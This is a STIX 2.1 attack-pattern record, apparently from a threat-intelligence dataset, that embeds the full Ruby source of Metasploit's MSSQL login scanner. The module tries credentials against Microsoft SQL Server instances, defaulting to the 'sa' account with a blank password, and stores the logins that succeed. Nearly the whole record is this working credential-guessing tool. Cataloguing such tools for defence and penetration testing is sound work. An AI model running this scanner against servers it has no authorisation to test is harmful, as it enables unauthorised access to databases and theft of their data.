{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5e44f55c-9f88-42e9-9ee0-6bb385205389",
    "created": "2024-08-14T16:26:54.983655Z",
    "modified": "2024-08-14T16:26:54.98366Z",
    "name": "MSSQL Login Utility",
    "description": "This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/mssql/mssql_login.rb",
            "external_id": "mssql_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0506#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/mssql'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::MSSQL\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'MSSQL Login Utility',\n      'Description'    => 'This module simply queries the MSSQL instance for a specific user/pass (default is sa with blank).',\n      'Author'         => 'MC',\n      'References'     =>\n        [\n          [ 'CVE', '1999-0506'] # Weak password\n        ],\n      'License'        => MSF_LICENSE,\n      # some overrides from authbrute since there is a default username and a blank password\n      'DefaultOptions' =>\n        {\n          'USERNAME' => 'sa',\n          'BLANK_PASSWORDS' => true\n        }\n    )\n\n    deregister_options('PASSWORD_SPRAY')\n  end\n\n  def run_host(ip)\n    print_status(\"#{rhost}:#{rport} - MSSQL - Starting authentication scanner.\")\n\n    if datastore['TDSENCRYPTION']\n      print_status(\"Manually enabled TLS/SSL to encrypt TDS payloads.\")\n    end\n\n    cred_collection = build_credential_collection(\n        realm: datastore['DOMAIN'],\n        username: datastore['USERNAME'],\n        password: datastore['PASSWORD']\n    )\n\n    scanner = Metasploit::Framework::LoginScanner::MSSQL.new(\n        host: ip,\n        port: rport,\n        proxies: datastore['PROXIES'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        connection_timeout: 30,\n        max_send_size: datastore['TCP::max_send_size'],\n        send_delay: datastore['TCP::send_delay'],\n        auth: datastore['Mssql::Auth'],\n        domain_controller_rhost: datastore['DomainControllerRhost'],\n        hostname: datastore['Mssql::Rhostname'],\n        windows_authentication: datastore['USE_WINDOWS_AUTHENT'],\n        tdsencryption: datastore['TDSENCRYPTION'],\n        framework: framework,\n        framework_module: self,\n        ssl: datastore['SSL'],\n        ssl_version: datastore['SSLVersion'],\n        ssl_verify_mode: datastore['SSLVerifyMode'],\n        ssl_cipher: datastore['SSLCipher'],\n        local_port: datastore['CPORT'],\n        local_host: datastore['CHOST']\n    )\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      if result.success?\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n\n        print_good \"#{ip}:#{rport} - Login Successful: #{result.credential}\"\n      else\n        invalidate_login(credential_data)\n        vprint_error \"#{ip}:#{rport} - LOGIN FAILED: #{result.credential} (#{result.status}: #{result.proof})\"\n      end\n    end\n  end\nend\n"
}